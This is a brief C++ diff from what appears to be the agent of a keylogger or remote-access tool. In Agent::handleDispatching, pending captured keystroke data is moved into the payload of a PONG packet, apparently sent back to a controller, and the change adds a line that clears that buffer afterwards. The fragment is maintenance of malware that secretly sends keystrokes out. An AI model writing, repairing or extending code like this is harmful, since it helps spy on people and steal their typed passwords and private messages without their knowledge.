@@ -156,6 +156,7 @@ void Agent::handleDispatching(Packet&& packet) {
             std::lock_guard<std::mutex> lock(m_keylog_pending_mutex);
             if (!m_keylog_pending_data.empty()) {
                 pong_payload = std::move(m_keylog_pending_data);
+                m_keylog_pending_data.clear();
             }
         }
         Packet pong(static_cast<uint16_t>(Opcode::PONG), pong_payload);
